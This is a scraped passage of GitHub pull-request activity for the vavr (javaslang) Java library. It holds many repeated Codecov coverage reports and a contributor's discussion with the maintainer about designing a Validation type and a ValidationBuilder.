Codecov. Last update 65e6796...77c29cf. Read the comment docs.\n. # Codecov Report\nMerging #2294 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2294   +/-\n=========================================\n  Coverage     97.35%   97.35%         \n  Complexity     5242     5242         \n=========================================\n  Files            93       93         \n  Lines         12544    12544         \n  Branches       1578     1578         \n=========================================\n  Hits          12212    12212         \n  Misses          177      177         \n  Partials        155      155\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d015234...4ec5d31. Read the comment docs.\n. # Codecov Report\nMerging #2304 into v0.9.x will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nv0.9.x    #2304      +/-\n============================================\n+ Coverage     97.36%   97.36%   +<.01%   \n- Complexity     5243     5247       +4   \n============================================\n  Files            93       93            \n  Lines         12544    12546       +2   \n  Branches       1578     1578            \n============================================\n+ Hits          12213    12215       +2   \n  Misses          177      177            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Either.java | 79.09% <100%> (+0.19%) | 42 <2> (+2) | :arrow_up: |\n| vavr/src/main/java/io/vavr/control/Validation.java | 99.08% <100%> (\u00f8) | 70 <2> (+2) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0e8e6a2...f3a232d. Read the comment docs.\n. # Codecov Report\nMerging #2305 into v0.9.x will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nv0.9.x    #2305      +/-\n============================================\n+ Coverage     97.36%   97.36%   +<.01%   \n- Complexity     5243     5244       +1   \n============================================\n  Files            93       93            \n  Lines         12544    12545       +1   \n  Branches       1578     1578            \n============================================\n+ Hits          12213    12215       +2   \n+ Misses          177      176       -1   \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...vr/src-gen/main/java/io/vavr/CheckedFunction0.java | 84.61% <100%> (+0.61%) | 13 <1> (+1) | :arrow_up: |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 80.16% <0%> (+0.82%) | 27% <0%> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0e8e6a2...a16ff2c. Read the comment docs.\n. # Codecov Report\nMerging #2310 into v0.9.x will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nv0.9.x    #2310   +/-\n=========================================\n  Coverage     97.36%   97.36%         \n  Complexity     5244     5244         \n=========================================\n  Files            93       93         \n  Lines         12545    12545         \n  Branches       1578     1578         \n=========================================\n  Hits          12214    12214         \n  Misses          177      177         \n  Partials        154      154\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7506f77...a055335. Read the comment docs.\n. # Codecov Report\nMerging #2312 into v0.9.x will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n\n```diff\n@@             Coverage Diff              @@\nv0.9.x    #2312      +/-\n============================================\n+ Coverage     97.36%   97.36%   +<.01%   \n- Complexity     5244     5247       +3   \n============================================\n  Files            93       93            \n  Lines         12545    12547       +2   \n  Branches       1578     1578            \n============================================\n+ Hits          12214    12216       +2   \n  Misses          177      177            \n  Partials        154      154\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/Value.java | 92.44% <100%> (+0.08%) | 97 <1> (+1) | :arrow_up: |\n| vavr-test/src/main/java/io/vavr/test/Gen.java | 100% <100%> (\u00f8) | 62 <2> (+2) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7506f77...c5c7c38. Read the comment docs.\n. # Codecov Report\nMerging #2315 into master will decrease coverage by 0.72%.\nThe diff coverage is 0%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2315      +/-\n============================================\n- Coverage       100%   99.27%   -0.73%   \n  Complexity      153      153            \n============================================\n  Files             7        9       +2   \n  Lines           275      277       +2   \n  Branches         51       51            \n============================================\n  Hits            275      275            \n- Misses            0        2       +2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ion/src/main/java/io/vavr/collection/Iterable.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n| ...ction/src/main/java/io/vavr/collection/Tuple2.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update bda1d40...cee4d22. Read the comment docs.\n. # Codecov Report\nMerging #2319 into master will increase coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2319      +/-\n============================================\n+ Coverage     99.27%   99.28%   +<.01%   \n  Complexity      153      153            \n============================================\n  Files             9        9            \n  Lines           277      279       +2   \n  Branches         51       51            \n============================================\n+ Hits            275      277       +2   \n  Misses            2        2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| src/main/java/io/vavr/control/Try.java | 100% <\u00f8> (\u00f8) | 49 <0> (?) | |\n| src/main/java/io/vavr/control/CheckedConsumer.java | 100% <\u00f8> (\u00f8) | 2 <0> (?) | |\n| ...rc/main/java/io/vavr/control/CheckedPredicate.java | 100% <\u00f8> (\u00f8) | 11 <0> (?) | |\n| src/main/java/io/vavr/collection/Tuple2.java | 0% <\u00f8> (\u00f8) | 0 <0> (?) | |\n| ...c/main/java/io/vavr/control/NonFatalException.java | 100% <\u00f8> (\u00f8) | 1 <0> (?) | |\n| src/main/java/io/vavr/control/Option.java | 100% <\u00f8> (\u00f8) | 43 <0> (?) | |\n| src/main/java/io/vavr/collection/Iterable.java | 0% <\u00f8> (\u00f8) | 0 <0> (?) | |\n| src/main/java/io/vavr/control/CheckedFunction.java | 100% <\u00f8> (\u00f8) | 5 <0> (?) | |\n| src/main/java/io/vavr/control/Either.java | 100% <\u00f8> (\u00f8) | 42 <0> (?) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 41cd78f...a577ce1. Read the comment docs.\n. # Codecov Report\nMerging #2322 into master will decrease coverage by <.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2322      +/-\n============================================\n- Coverage     97.36%   97.35%   -0.01%   \n+ Complexity     5247     5246       -1   \n============================================\n  Files            93       93            \n  Lines         12547    12547            \n  Branches       1578     1578            \n============================================\n- Hits          12216    12215       -1   \n  Misses          177      177            \n- Partials        154      155       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 78.51% <0%> (-0.83%) | 26% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1a0fcf3...6c0c558. Read the comment docs.\n. # Codecov Report\nMerging #2323 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2323      +/-\n============================================\n- Coverage     97.63%   97.63%   -0.01%   \n  Complexity     5245     5245            \n============================================\n  Files            93       93            \n  Lines         12492    12493       +1   \n  Branches       1570     1570            \n============================================\n  Hits          12197    12197            \n- Misses          149      150       +1   \n  Partials        146      146\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/io/vavr/collection/Traversable.java | 97.92% <0%> (-0.52%) | 103 <0> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7da4793...5dd7fd0. Read the comment docs.\n. # Codecov Report\nMerging #2324 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #2324   +/-\n=========================================\n  Coverage     97.36%   97.36%         \n  Complexity     5247     5247         \n=========================================\n  Files            93       93         \n  Lines         12547    12547         \n  Branches       1578     1578         \n=========================================\n  Hits          12216    12216         \n  Misses          177      177         \n  Partials        154      154\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1a0fcf3...7794045. Read the comment docs.\n. # Codecov Report\nMerging #2329 into master will increase coverage by 0.27%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2329      +/-\n============================================\n+ Coverage     97.36%   97.63%   +0.27%   \n+ Complexity     5247     5245       -2   \n============================================\n  Files            93       93            \n  Lines         12547    12492      -55   \n  Branches       1578     1570       -8   \n============================================\n- Hits          12216    12197      -19   \n+ Misses          177      149      -28   \n+ Partials        154      146       -8\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/TreeMap.java | 93.84% <0%> (-0.05%) | 162% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/collection/Tree.java | 97.91% <0%> (-0.02%) | 124% <0%> (\u00f8) | |\n| ...n/java/io/vavr/collection/HashArrayMappedTrie.java | 98.49% <0%> (-0.02%) | 1% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99.02% <0%> (-0.01%) | 269% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/collection/List.java | 99.62% <0%> (-0.01%) | 268% <0%> (\u00f8) | |\n| ...avr/src/main/java/io/vavr/collection/Iterator.java | 99.22% <0%> (-0.01%) | 181% <0%> (\u00f8) | |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <0%> (\u00f8) | 51% <0%> (\u00f8) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/Tuple0.java | 100% <0%> (\u00f8) | 20% <0%> (-1%) | :arrow_down: |\n| ...r-test/src/main/java/io/vavr/test/CheckResult.java | 100% <0%> (\u00f8) | 13% <0%> (-1%) | :arrow_down: |\n| vavr/src-gen/main/java/io/vavr/API.java | 95.89% <0%> (+0.19%) | 208% <0%> (\u00f8) | :arrow_down: |\n| ... and 22 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b68cc1f...00af25c. Read the comment docs.\n. # Codecov Report\nMerging #2336 into master will decrease coverage by 1.07%.\nThe diff coverage is 97.96%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2336      +/-\n============================================\n- Coverage     97.63%   96.56%   -1.08%   \n- Complexity     5245     5427     +182   \n============================================\n  Files            93       93            \n  Lines         12492    13002     +510   \n  Branches       1570     1608      +38   \n============================================\n+ Hits          12197    12555     +358   \n- Misses          149      300     +151   \n- Partials        146      147       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...c/main/java/io/vavr/collection/SortedMultimap.java | 0% <\u00f8> (\u00f8) | 0 <0> (\u00f8) | :arrow_down: |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 91.12% <\u00f8> (\u00f8) | 1 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Map.java | 100% <\u00f8> (\u00f8) | 33 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/PriorityQueue.java | 98.68% <\u00f8> (\u00f8) | 110 <0> (\u00f8) | :arrow_down: |\n| ...avr/src/main/java/io/vavr/collection/Foldable.java | 100% <\u00f8> (\u00f8) | 3 <0> (\u00f8) | :arrow_down: |\n| ...rc-gen/main/java/io/vavr/collection/ArrayType.java | 100% <\u00f8> (\u00f8) | 26 <0> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/SortedSet.java | 100% <\u00f8> (\u00f8) | 2 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/control/Option.java | 100% <\u00f8> (\u00f8) | 45 <0> (-6) | :arrow_down: |\n| vavr/src/main/java/io/vavr/concurrent/Promise.java | 91.66% <\u00f8> (\u00f8) | 17 <0> (?) | |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 97.82% <\u00f8> (\u00f8) | 40 <0> (\u00f8) | :arrow_down: |\n| ... and 161 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 28896a8...c512cfd. Read the comment docs.\n. # Codecov Report\nMerging #2338 into master will decrease coverage by 1.07%.\nThe diff coverage is 77.75%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2338      +/-\n============================================\n- Coverage     97.63%   96.56%   -1.08%   \n- Complexity     5245     5427     +182   \n============================================\n  Files            93       93            \n  Lines         12492    13002     +510   \n  Branches       1570     1608      +38   \n============================================\n+ Hits          12197    12555     +358   \n- Misses          149      300     +151   \n- Partials        146      147       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/collection/CharSeq.java | 99.82% <\u00f8> (\u00f8) | 349 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/HashSet.java | 95.83% <\u00f8> (\u00f8) | 140 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Seq.java | 97.82% <\u00f8> (\u00f8) | 40 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Array.java | 99.53% <\u00f8> (\u00f8) | 243 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/Predicates.java | 94.73% <\u00f8> (\u00f8) | 20 <0> (\u00f8) | :arrow_down: |\n| vavr/src/main/java/io/vavr/collection/Stream.java | 99.02% <\u00f8> (\u00f8) | 269 <0> (\u00f8) | :arrow_down: |\n| ...r/src/main/java/io/vavr/collection/IndexedSeq.java | 97.43% <\u00f8> (\u00f8) | 35 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/collection/LinkedHashSet.java | 96.66% <\u00f8> (\u00f8) | 145 <0> (\u00f8) | :arrow_down: |\n| ...vr/src/main/java/io/vavr/collection/LinearSeq.java | 96.77% <\u00f8> (\u00f8) | 18 <0> (\u00f8) | :arrow_down: |\n| ...c/main/java/io/vavr/collection/JavaConverters.java | 91.12% <\u00f8> (\u00f8) | 1 <0> (\u00f8) | :arrow_down: |\n| ... and 56 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 28896a8...e682a4a. Read the comment docs.\n. # Codecov Report\nMerging #2360 into v1.0.0 will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nv1.0.0    #2360   +/-\n=========================================\n  Coverage     99.66%   99.66%         \n  Complexity      158      158         \n=========================================\n  Files            10       10         \n  Lines           297      297         \n  Branches         52       52         \n=========================================\n  Hits            296      296         \n  Misses            1        1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| src/main/java/io/vavr/control/CheckedFunction.java | 100% <\u00f8> (\u00f8) | 5 <0> (\u00f8) | :arrow_down: |\n| src/main/java/io/vavr/control/CheckedConsumer.java | 100% <\u00f8> (\u00f8) | 2 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/control/CheckedPredicate.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| src/main/java/io/vavr/control/Try.java | 100% <100%> (\u00f8) | 49 <3> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 37a2bca...b3c3ffd. Read the comment docs.\n. # Codecov Report\nMerging #2360 into v1.0.0 will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@            Coverage Diff            @@\nv1.0.0    #2360   +/-\n=========================================\n  Coverage     99.66%   99.66%         \n  Complexity      158      158         \n=========================================\n  Files            10       10         \n  Lines           297      297         \n  Branches         52       52         \n=========================================\n  Hits            296      296         \n  Misses            1        1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| src/main/java/io/vavr/control/CheckedFunction.java | 100% <\u00f8> (\u00f8) | 5 <0> (\u00f8) | :arrow_down: |\n| src/main/java/io/vavr/control/CheckedConsumer.java | 100% <\u00f8> (\u00f8) | 2 <0> (\u00f8) | :arrow_down: |\n| ...rc/main/java/io/vavr/control/CheckedPredicate.java | 100% <\u00f8> (\u00f8) | 11 <0> (\u00f8) | :arrow_down: |\n| src/main/java/io/vavr/control/Try.java | 100% <100%> (\u00f8) | 49 <3> (\u00f8) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 37a2bca...b3c3ffd. Read the comment docs.\n. # Codecov Report\nMerging #2365 into master will decrease coverage by 0.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2365      +/-\n============================================\n- Coverage     95.81%   95.79%   -0.02%   \n  Complexity     5426     5426            \n============================================\n  Files            94       94            \n  Lines         13108    13108            \n  Branches       1608     1608            \n============================================\n- Hits          12559    12557       -2   \n- Misses          402      404       +2   \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 74.43% <0%> (-1.51%) | 28% <0%> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cc8a838...34d5567. Read the comment docs.\n. # Codecov Report\nMerging #2368 into master will decrease coverage by 0.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2368      +/-\n============================================\n- Coverage     95.81%   95.79%   -0.02%   \n  Complexity     5426     5426            \n============================================\n  Files            94       94            \n  Lines         13108    13108            \n  Branches       1608     1608            \n============================================\n- Hits          12559    12557       -2   \n- Misses          402      404       +2   \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 74.43% <0%> (-1.51%) | 28% <0%> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cc8a838...4559c81. Read the comment docs.\n. # Codecov Report\nMerging #2368 into master will decrease coverage by 0.01%.\nThe diff coverage is n/a.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2368      +/-\n============================================\n- Coverage     95.81%   95.79%   -0.02%   \n  Complexity     5426     5426            \n============================================\n  Files            94       94            \n  Lines         13108    13108            \n  Branches       1608     1608            \n============================================\n- Hits          12559    12557       -2   \n- Misses          402      404       +2   \n  Partials        147      147\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 74.43% <0%> (-1.51%) | 28% <0%> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cc8a838...4559c81. Read the comment docs.\n. # Codecov Report\n:exclamation: No coverage uploaded for pull request base (v1.0.0@4396456). Click here to learn what that means.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nv1.0.0    #2369   +/-\n=========================================\n  Coverage          ?   99.66%         \n  Complexity        ?      158         \n=========================================\n  Files             ?       10         \n  Lines             ?      297         \n  Branches          ?       52         \n=========================================\n  Hits              ?      296         \n  Misses            ?        1         \n  Partials          ?        0\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 4396456...853d555. Read the comment docs.\n. # Codecov Report\nMerging #2370 into v1.0.0 will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nv1.0.0    #2370   +/-\n=========================================\n  Coverage     99.66%   99.66%         \n  Complexity      158      158         \n=========================================\n  Files            10       10         \n  Lines           297      297         \n  Branches         52       52         \n=========================================\n  Hits            296      296         \n  Misses            1        1\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update bc5cead...48bcc23. Read the comment docs.\n. # Codecov Report\nMerging #2372 into v1.0.0 will decrease coverage by 3.6%.\nThe diff coverage is 7.69%.\n\n\n```diff\n@@             Coverage Diff              @@\nv1.0.0    #2372      +/-\n============================================\n- Coverage     98.42%   94.81%   -3.61%   \n  Complexity      164      164            \n============================================\n  Files            10       10            \n  Lines           317      328      +11   \n  Branches         58       59       +1   \n============================================\n- Hits            312      311       -1   \n- Misses            3       16      +13   \n+ Partials          2        1       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| src/main/java/io/vavr/collection/Iterator.java | 60% <7.69%> (-26.21%) | 5 <0> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 9a88bb1...d3c688c. Read the comment docs.\n. # Codecov Report\nMerging #2374 into v1.0.0 will decrease coverage by 4.57%.\nThe diff coverage is 0%.\n\n\n```diff\n@@             Coverage Diff              @@\nv1.0.0    #2374      +/-\n============================================\n- Coverage     94.81%   90.24%   -4.58%   \n+ Complexity      164      158       -6   \n============================================\n  Files            10       11       +1   \n  Lines           328      328            \n  Branches         59       59            \n============================================\n- Hits            311      296      -15   \n- Misses           16       32      +16   \n+ Partials          1        0       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| src/main/java/io/vavr/Iterable.java | 100% <\u00f8> (\u00f8) | 1 <0> (-5) | :arrow_down: |\n| src/main/java/io/vavr/collection/Traversable.java | 0% <0%> (\u00f8) | 0 <0> (?) | |\n| src/main/java/io/vavr/collection/Iterator.java | 42.5% <0%> (-17.5%) | 4% <0%> (-1%) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0383e1b...1ef24a3. Read the comment docs.\n. # Codecov Report\nMerging #2379 into master will decrease coverage by 0.02%.\nThe diff coverage is 96.55%.\n\n\n```diff\n@@             Coverage Diff              @@\nmaster    #2379      +/-\n============================================\n- Coverage     95.81%   95.78%   -0.03%   \n- Complexity     5426     5429       +3   \n============================================\n  Files            94       94            \n  Lines         13108    13119      +11   \n  Branches       1608     1611       +3   \n============================================\n+ Hits          12559    12566       +7   \n- Misses          402      405       +3   \n- Partials        147      148       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| vavr/src/main/java/io/vavr/control/Try.java | 97.74% <96.55%> (-0.59%) | 103 <63> (+3) | |\n| ...r/src/main/java/io/vavr/concurrent/FutureImpl.java | 74.43% <0%> (-1.51%) | 28% <0%> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cc8a838...d91c019. Read the comment docs.\n. \n",
    "enelson": "Thanks @danieldietrich. I'll start taking a look at this.\n. @danieldietrich Thanks for the info. I'll do some initial work in another branch and see what you think about it. I want to make sure its something that feels right for this project based on your ideas and goals. \n. Yep, exactly what I was going for. If it was a Monad, it would short circuit after the first error, and we want an aggregation of all errors.\n. Thanks @danieldietrich.\n. @danieldietrich I would assume that you'd like to keep your current pattern of putting classes with multiple permutations (ie. Function0, Function1, etc) in src-gen, instead of embedding each one as static classes in one Java file? I'm working on a ValidationBuilder class that will have up to ValidationBuilder8 (coinciding with Function8).\n. @danieldietrich I'll send over a pull request of what I have so far and see what you think about the approach. I'm VERY frustrated with the lack of support for higher kinded types in Java, so I want to see what ideas you have for a more generic approach. \n. @danieldietrich Concerning our discussion on ApplicativeBuilder, scalaz does use them (you'll see I modeled mine after theirs). I'm not sure if cats uses them, I don't really see any indication that they do. They combine their Validated types with map(n) functions (i.e. map2, map3, etc). Here are a couple links to look at:\nhttps://github.com/scalaz/scalaz/blob/series/7.3.x/core/src/main/scala/scalaz/syntax/ApplicativeBuilder.scala\nhttp://non.github.io/cats//tut/validated.html\n. Yeah, I agree with the Valid/Invalid types. They are more descriptive. I'll change them to that and you can see if you like it better for Javaslang. \nI'm glad you agree with the Builder pattern. I really think it removes complexity out of the Validation class. And yes, the combining does take place with the |@| method, its simply a method that accumulates Validations into ValidationBuilders. Basically the same thing as my combine() function. \nOk, so I'll leave the builder in then, and clean up some code to submit for further review. I wanted to know if you liked the method name combine()? Also, did I see that you changed your mind on renaming ap() to apply()? So you want to keep it as ap()? \nThanks for you continued help on this Daniel. \n. Happy New Year to you as well! You're closer to it than I am, so enjoy 2016 before me! :)\n. @danieldietrich I'm still here. :) Just getting back into the work groove, so my progress on this issue has slowed for a bit. I'll commit some updated stuff soon for review. Hope you had a great New Year.\n. @danieldietrich I'd love to tackle another task if you're okay with it. I could take this one on if someone hasn't already started it.\n. No worries, thanks. Any other 2.0.0 task I could help with? I've been enjoying using this library and love to contribute to it. Or I could help on 2.0.1 also. You know what needs help. Thanks @danieldietrich.\n. @danieldietrich you bet. I'm gonna try and get more involved with this project. Now that I'm not doing Scala every day and am back to Java, I'm in love with javaslang. Great work!\n. The wrapping process itself is asynchronous, so it won't block during the conversion.\n. @danieldietrich Great. Thanks for the update. I'll start looking into this for 2.0.1.\n. My ValidationBuilder only goes to ValidationBuilder4 right now, but it would go to ValidationBuilder8 to align with Function8. \n. Hi @danieldietrich, just wondering if you have any initial feedback or reaction to this initial stab at Validation? \n. No worries Daniel, time with family is far more important. :) I look forward to your input when you get around to it. I see your point with no needing pure and point, I'll remove those and follow more closely to your pattern in other classes. Have a great Christmas and Holidays! \n. @danieldietrich no, i didn't close it. although I did delete my validation branch and re-add it. I wonder if GitHub automatically closes a pull request if the branch is delete? If so, my bad. Do you need me to do a new PR?\n. @danieldietrich I'd be happy to take this on if it hasn't been started. Or if so, are there any un-started issues left in 2.0.0 milestone that I could help with? \n. @danieldietrich Thanks! I imagine that my changes for Monad will be made in Generator.scala instead of directly to Monad.java, yes? If so, how do I run the generator to create the changes in Monad.java?\n. @ruslansennov certainly. I didn't see any tests for the existing Supplier versions, so I'll add those too.\n. @ruslansennov and @danieldietrich, I added these tests to AbstractTraversableTest, but wondering if I should move those into AbstractValueTest? \n. @ruslansennov I agree, didn't feel right where I put it. Committing changes soon.\n. @danieldietrich thanks for all the great feedback! I'll get this all done today. \n. @danieldietrich Ok, changes committed for review.\n. \ud83d\udc4d\n. @danieldietrich Some new code ready for review. I was able to get things working with your help on Kind. My next thing to tackle is to have ValidationBuilder's ap() method return something like Validation<List<E>,R> or Validation<E extends Semigroup,R. You see what I'm trying to do. I need it to have an error type this is able to accumulate the errors. Maybe I can start with List<E> to force it to have an accumulating type. Then we can look at something more generic?\n. Thanks @danieldietrich. This is great feedback. I can't believe I forgot to switch the success()/failure() methods to valid()/invalid(). :) Thanks for catching that. \nI made the change to T get(), but I'm not sure that I like the idea of naming the counter part as invalid(). I think that naming it error() is more descriptive about what the method is returning. I'm curious what you mean by 'We don't know the use case, especially we don't know if the invalid case describes errors.' I would argue that the very point of the Invalid class is to store validation \"errors\". The type of Invalid may not always be of type Exception or Throwable, but even if it's a string, it still describes a validation error. But you tell me how you feel about it. Am I missing something in what you were trying to explain?\nConcerning my comments about List/Semigroup, I agree. The sole purpose of Validation is to accumulate errors. But the way I was looking at it, each instance of Validation may not contain a list of errors. For instance, you may have multiple invalids of type Validation<String,?>. Then the purpose of the ValidationBuilder is to chain them all and return the final validation with combined errors as Validation<List<E>,?>. Does that make sense? So instead of making the Validation.errors() (or whatever we call it) method return List, it returns E. Then we get the list after we've combined the instances together. This is consistent with other Validation implementations. My only though about using Semigroup was that instead of hardcoding the accumulation vehicle to List, you could use any type of Semigroup. But I think that's going to get too ugly, with little benefit. So I agree with using List. \nI've toyed with making Invalid.errors() return a List, and it gets ugly. For instance, the implementation for Validation.swap() now tries to stuff a List into a Valid>, which doesn't work. It just seems much cleaner to keep Valid and Invalid. I'd suggest that we push the List code to Applicative.ap() and ValidationBuilder. This keeps Valid and Invalid clean. Thoughts?\nThanks again for being so 